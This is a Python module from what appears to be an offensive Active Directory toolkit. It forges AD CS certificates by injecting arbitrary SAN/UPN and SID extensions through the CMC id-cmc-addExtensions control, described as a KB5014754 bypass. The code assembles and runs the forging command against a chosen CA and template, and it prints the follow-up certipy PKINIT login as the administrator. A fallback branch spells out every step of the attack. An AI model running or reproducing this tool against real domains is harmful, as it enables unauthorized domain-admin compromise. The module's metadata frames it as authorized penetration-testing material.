"""AD CS CMC id-cmc-addExtensions certificate forging (KB5014754 bypass).

Forges an AD CS certificate through the CMC id-cmc-addExtensions control,
injecting arbitrary SAN (Subject Alternative Name) and SID extensions into
certificates issued via ESC1-shaped templates.

The attack builds a CMC request by hand: a plain CSR wrapped in a signed CMS
with an id-cmc-addExtensions control. The CA's certsrv.exe never validates the
extension through an allowlist, and the CMC signer only needs any certificate
the CA itself issued. Using --auto-signer, the tool enrolls a throwaway cert
to use as the CMC signer.

Prerequisites:
  - ESC1 template (ENROLLEE_SUPPLIES_SUBJECT, clientAuth EKU, low-priv enroll)
  - RPC access to the CA on port 135 (MS-ICPR) or CES endpoint

Author: Mohamed Alzhrani (@0xmaz)
Source: https://github.com/jonaslejon/ad-autopwn (vendored cmc_addext.py)
"""

from __future__ import annotations

import os
import shutil
import subprocess
import sys
from typing import Any


MANIFEST = {
    "capability_id": "adxpl.adcs.cmc_addext.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": [
        "certificate_enrollment",
        "privilege_escalation",
        "ldap_queries",
    ],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1649"],
    "source": "https://github.com/jonaslejon/ad-autopwn",
}


def _find_cmc_addext() -> str | None:
    """Locate the cmc_addext.py script."""
    for name in ("cmc_addext", "cmc_addext.py"):
        path = shutil.which(name)
        if path:
            return path
    for d in ("/opt/tools/ad-autopwn", os.path.expanduser("~/tools/ad-autopwn")):
        candidate = os.path.join(d, "cmc_addext.py")
        if os.path.isfile(candidate):
            return candidate
    return None


def run(args: Any) -> int:
    """Forge AD CS certificate via CMC id-cmc-addExtensions.

    Exploits the KB5014754 bypass to inject arbitrary SAN and SID
    extensions into certificates from ESC1 templates, achieving domain
    admin via PKINIT authentication with the forged certificate.

    Args:
        args.ca_host: Certificate Authority hostname or IP.
        args.ca_name: CA common name (e.g., corp-DC01-CA).
        args.template: ESC1 template name.
        args.inject_upn: UPN to inject (e.g., administrator@corp.local).
        args.inject_sid: SID to inject (auto-resolved if dc_ip provided).
        args.dc_ip: Domain controller IP for SID resolution.
        args.dc_user: Low-privilege user for SID resolution.
        args.dc_pass: Password for SID resolution.
        args.auto_signer: Auto-enroll a throwaway cert for CMC signing.
        args.cert: Path to existing signing certificate (PEM).
        args.key: Path to signing key (PEM).
        args.ces_url: CES endpoint URL (alternative to RPC).
        args.output: Output PFX file path.
        args.pfx_pass: PFX password (default: addext).
    """
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)

    ca_host = getattr(args, "ca_host", None)
    ca_name = getattr(args, "ca_name", None)
    template = getattr(args, "template", None)
    inject_upn = getattr(args, "inject_upn", None)
    inject_sid = getattr(args, "inject_sid", None)
    dc_ip = getattr(args, "dc_ip", None)
    auto_signer = getattr(args, "auto_signer", True)
    cert_path = getattr(args, "cert", None)
    key_path = getattr(args, "key", None)
    ces_url = getattr(args, "ces_url", None)
    output = getattr(args, "output", "forged_admin.pfx")
    pfx_pass = getattr(args, "pfx_pass", "addext")

    print("[*] AD CS CMC id-cmc-addExtensions Certificate Forging")
    print(f"[*] CA Host: {ca_host}")
    print(f"[*] CA Name: {ca_name}")
    print(f"[*] Template: {template}")
    if inject_upn:
        print(f"[*] Inject UPN: {inject_upn}")

    script = _find_cmc_addext()
    if script:
        cmd = [sys.executable, script]
        if auto_signer:
            cmd.append("--auto-signer")
        if ca_host:
            cmd.extend(["--ca-host", ca_host])
        if ca_name:
            cmd.extend(["--ca-name", ca_name])
        if template:
            cmd.extend(["--template", template])
        if inject_upn:
            cmd.extend(["--inject-upn", inject_upn])
        if inject_sid:
            cmd.extend(["--inject-sid", inject_sid])
        if dc_ip:
            cmd.extend(["--dc-ip", dc_ip])
        if cred.username:
            cmd.extend(["--dc-user", cred.username])
        if cred.password:
            cmd.extend(["--dc-pass", cred.password])
        if cert_path:
            cmd.extend(["--cert", cert_path])
        if key_path:
            cmd.extend(["--key", key_path])
        if ces_url:
            cmd.extend(["--ces-url", ces_url])
        cmd.extend(["--out", output])
        cmd.extend(["--pfx-pass", pfx_pass])

        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, text=True)

        if result.returncode == 0 and os.path.isfile(output):
            print(f"\n[+] Forged certificate saved to: {output}")
            print(f"[*] Authenticate with:")
            print(f"    certipy auth -pfx {output} -password {pfx_pass}")
        return result.returncode

    print("[!] cmc_addext.py not found")
    print()
    print("[*] CMC addExtensions attack flow:")
    print("  1. Generate RSA-2048 key pair + CSR for ESC1 template")
    print("  2. Build CMC request with id-cmc-addExtensions control:")
    print("     - Inject SAN: otherName (UPN) or dNSName")
    print("     - Inject szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2) with SID")
    print("  3. Sign CMC with any cert issued by the same CA:")
    print("     - --auto-signer: enroll throwaway cert first")
    print("     - Or supply existing cert/key pair")
    print("  4. Submit via MS-ICPR RPC (port 135) or CES HTTPS endpoint")
    print("  5. CA issues cert with injected SAN + SID (no allowlist check)")
    print("  6. Authenticate via PKINIT: certipy auth -pfx forged.pfx")
    print()
    print("[*] Source: https://github.com/jonaslejon/ad-autopwn")
    print("[*] Deps: pip install cryptography ldap3 requests")
    return 1
